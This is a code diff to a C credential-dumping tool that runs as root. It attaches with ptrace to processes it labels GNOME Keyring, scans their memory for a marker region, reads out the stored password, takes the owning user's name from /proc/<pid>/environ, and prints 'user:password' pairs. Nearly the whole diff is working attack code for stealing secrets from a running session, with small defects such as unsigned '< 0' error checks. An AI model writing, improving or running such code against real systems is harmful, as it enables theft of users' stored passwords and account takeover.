@@ -13,19 +13,61 @@
 
 #define PROC "/proc"
 
-int dumpPasswd(Target target, int pid)
+char *getUser(int pid)
 {
-    char passwd[1024] = {0};
+    char environFile[128] = {0};
+    char *var = NULL, *user = NULL, *logname=NULL, *res = NULL;
+    size_t size = 0;
+    int len=0, i =0, maxLines = 20;
+    FILE *fp = NULL;
+
+    snprintf(environFile, 128, "%s/%d/environ", PROC, pid);
+    fp = fopen(environFile, "r");
+    
+    while ( i != maxLines )
+    {
+        if ( (getdelim(&var, &size, '\0', fp)) < 0 )
+        {
+            printf("  [!] ERROR: getting line - %s\n", strerror(errno)); 
+            goto CLEANUP;
+        }
+        if ( (user = strstr(var, "USER=")) )
+        {
+            user += 5; // skip USER=
+            len = size-5;
+            res = calloc(len+1, 1);
+            memcpy(res, user, len);
+            break;
+        }
+        if (var != NULL)
+        {
+            free(var);
+            var = NULL;
+        }
+        size = 0;
+    }
+
+    CLEANUP:
+        if ( var != NULL )
+            free(var);
+        fclose(fp);
+        return res;
+}
+
+int dumpPasswdKeyring(Target target, int pid)
+{
+    char passwd[1024] = {0}, *user = NULL;
     unsigned long chunk = 0;
     unsigned long eggAddr = 0;
     unsigned long *egg;
-    int status = -1;
+    unsigned long marker = 0;
+    int status = -1, loopNum=0, loopMax=4;
     int passwdDone = 0;
     int cur = 0;
 
     if ( ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0 )
     {
-        printf("Ptrace attach failed - %s\n", strerror(errno));
+        printf("  [!] ERROR: Ptrace attach failed - %s\n", strerror(errno));
         return -1;
     }
 
@@ -34,20 +76,48 @@ int dumpPasswd(Target target, int pid)
     {
         if ( (eggAddr = ptrace(PTRACE_PEEKDATA, pid, (void*)target.eggPtrAddr, NULL)) < 0 )
         {
-            printf("Ptrace peek 1 failed - %s\n", strerror(errno));
+            printf(" [!] ERROR: Ptrace peek 1 failed - %s\n", strerror(errno));
             return -1;
         }
 
-        eggAddr = eggAddr + target.passwdIndex * sizeof(long);
+        //eggAddr = eggAddr + target.passwdIndex * sizeof(long);
+        while (1)
+        {
+            if (loopNum == loopMax)
+            {
+                printf("  [!] ERROR: Cannot find marker for egg region\n");
+                return -1;
+            }
 
+            marker = 0;
+            if ( (marker = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
+            {
+                printf("  [!] ERROR: Ptrace peek marker failed - %s\n", strerror(errno));
+                return -1;
+            }
+            if ( (marker & 0xff) != 0xaa )
+            {
+                eggAddr += sizeof(long)*2; // Password starts 2 words after the last "secure wiped" word
+                break;
+            }
+            eggAddr += sizeof(long);
+            loopNum += 1;
+        }
+
+        loopNum = 0;
         while (!passwdDone)
         {
+            if (loopNum == 256)
+            {
+                printf("  [!] ERROR: Cannot find password\n");
+                return -1;
+            }
             chunk = 0;
             eggAddr += cur;
   
             if ( (chunk = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
             {
-                printf("Ptrace peek 2 failed - %s\n", strerror(errno));
+                printf("  [!] ERROR: Ptrace peek 2 failed - %s\n", strerror(errno));
                 return -1;
             }
             memcpy(passwd+cur, &chunk, sizeof(long));
@@ -57,17 +127,21 @@ int dumpPasswd(Target target, int pid)
                     passwdDone = 1;
             }
             cur += sizeof(long);
+            loopNum += 1;
         }
         if ( ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0 )
         {
-            printf("Ptrace attach failed\n");
+            printf(" [!] ERROR: Ptrace attach failed\n");
             return -1;
         }
     }
 
     if (passwd)
     {
-        printf("Password: %s\n", passwd);
+        if ( (user = getUser(pid)) == NULL )
+            printf("  [!] Error getting user for pid\n");
+
+        printf("  %s:%s\n", user, passwd);
         return 0;
     }
     else
@@ -80,7 +154,7 @@ int processTarget(Target target)
 {
     DIR *dir = NULL;
     struct dirent* de = 0;
-    int pid = -1;
+    int pid = -1, ret = -1;
     int result = 0;
     FILE *fp = NULL;
     size_t size = 1024;
@@ -91,7 +165,7 @@ int processTarget(Target target)
     dir = opendir(PROC);
     if ( dir == NULL )
     {
-        printf("Failed to open /proc\n");
+        printf("[!] ERROR: Failed to open /proc\n");
         return -1;
     }
 
@@ -114,9 +188,12 @@ int processTarget(Target target)
         {
             if ( strstr(taskName, target.processName) )
             {
-                printf("task: %s\n", taskName);
-                printf("pid: %d\n", pid);
-                dumpPasswd(target, pid);
+                printf("[+] GNOME KEYRING (%d)\n", pid);
+                if ( dumpPasswdKeyring(target, pid) < 0 )
+                {
+                    printf("  [!] ERROR: dumping passwords from keyring\n");
+                    goto CLEANUP;
+                }
             }
         }
         if (taskName != NULL)
@@ -124,7 +201,28 @@ int processTarget(Target target)
             free(taskName);
             taskName = NULL;
         }
+
+        if ( fp != NULL )
+        {
+            fclose(fp);
+            fp = NULL;
+        }
     }
+
+    ret = 0;
+    CLEANUP:
+         if (taskName != NULL)
+        {
+            free(taskName);
+            taskName = NULL;
+        }
+
+        if ( fp != NULL )
+        {
+            fclose(fp);
+            fp = NULL;
+        }
+        return ret;
 }
 
 int main()
@@ -133,7 +231,7 @@ int main()
 
     if ( getuid() != 0 )
     {
-        printf("Must be root!\n");
+        printf("[!] Must be root!\n");
         return -1;
     }
 
